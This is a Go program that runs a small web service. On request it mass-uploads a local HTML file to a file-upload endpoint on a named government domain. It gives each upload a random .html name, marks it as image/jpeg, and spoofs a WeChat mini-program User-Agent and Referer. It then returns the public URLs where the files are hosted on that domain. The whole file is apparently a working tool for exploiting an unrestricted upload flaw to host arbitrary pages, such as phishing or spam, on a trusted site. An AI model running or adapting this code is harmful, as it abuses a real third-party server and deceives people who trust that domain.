package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"strconv"
	"time"
)

type responseData struct {
	Files []struct {
		Name         string `json:"name"`
		Size         int    `json:"size"`
		Type         string `json:"type"`
		Url          string `json:"url"`
		DeleteUrl    string `json:"deleteUrl"`
		ThumbnailUrl string `json:"thumbnailUrl"`
		DeleteType   string `json:"deleteType"`
		Fileid       string `json:"fileid"`
	} `json:"files"`
	TempFolder interface{} `json:"tempFolder"`
}

func main() {
	s := gin.Default()
	s.GET("/create/:num", func(c *gin.Context) {
		num := c.Param("num")

		numI, _ := strconv.Atoi(num)
		flist := []string{}
		var number = 0

		for i := 0; i < numI; i++ {
			number++
			if number >= 5 {
				time.Sleep(time.Second)
				number = 0
			}
			flist = append(flist, GetDomain(i))
		}

		stv := ""
		for _, v := range flist {
			stv += v + "\n"
		}
		c.String(http.StatusOK, stv)
	})
	s.Run(":80")

}

func GetDomain(i int) string {
	// 要上传的文件路径
	filePath := "tezt.html"
	// 上传接口URL
	url := "https://stczw.eco-city.gov.cn:10225/fileserver/FileUpload/Upload"

	// 创建一个新的表单文件请求
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// 添加session_token字段 (可以替换为空或需要的值)
	_ = writer.WriteField("session_token", "")

	// 打开文件
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return ""
	}
	defer file.Close()

	// 添加文件字段，文件的字段名为file，文件内容来自file变量，文件名为指定的filename
	fileName := fmt.Sprintf("%d%d%d.html", time.Now().Unix(), rand.Intn(999), i)

	part, err := writer.CreateFormFile("file", fileName)
	if err != nil {
		fmt.Println("Error creating form file:", err)
		return ""
	}

	// 将文件内容复制到表单中的part
	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Println("Error copying file:", err)
		return ""
	}

	// 添加自定义请求头headers，Content-Type: image/jpeg
	err = writer.WriteField("headers", "Content-Type: image/jpeg")
	if err != nil {
		fmt.Println("Error writing field:", err)
		return ""
	}

	// 结束并关闭writer，完成multipart/form-data的构建
	err = writer.Close()
	if err != nil {
		fmt.Println("Error closing writer:", err)
		return ""
	}

	// 创建请求
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return ""
	}

	// 设置请求头
	req.Header.Set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.54(0x18003635) NetType/WIFI Language/zh_CN")
	req.Header.Set("Accept-Encoding", "gzip,compress,br,deflate")
	req.Header.Set("Content-Type", writer.FormDataContentType()) // multipart/form-data
	req.Header.Set("Referer", "https://servicewechat.com/wx98f0c636dce332fe/95/page-frame.html")

	// 使用http客户端发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return ""
	}
	defer resp.Body.Close()

	// 打印响应内容
	fmt.Println("Response Status:", resp.Status)
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return ""
	}
	fmt.Println("Response Body:", string(respBody))

	var respd responseData
	err = json.Unmarshal(respBody, &respd)
	if err != nil {
		fmt.Println("Error unmarshalling response body:", err)
	}
	return "https://stczw.eco-city.gov.cn:10225/fileserver" + respd.Files[0].Url
}

// CopyFile 方法：复制文件
func CopyFile(srcPath, destPath string) error {
	// 打开源文件
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return fmt.Errorf("error opening source file: %v", err)
	}
	defer srcFile.Close()

	// 创建目标文件
	destFile, err := os.Create(destPath)
	if err != nil {
		return fmt.Errorf("error creating destination file: %v", err)
	}
	defer destFile.Close()

	// 复制文件内容
	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		return fmt.Errorf("error copying file: %v", err)
	}

	return nil
}

// Delete 方法：删除文件
func Delete(filePath string) error {
	// 删除文件
	err := os.Remove(filePath)
	if err != nil {
		return fmt.Errorf("error deleting file: %v", err)
	}

	return nil
}
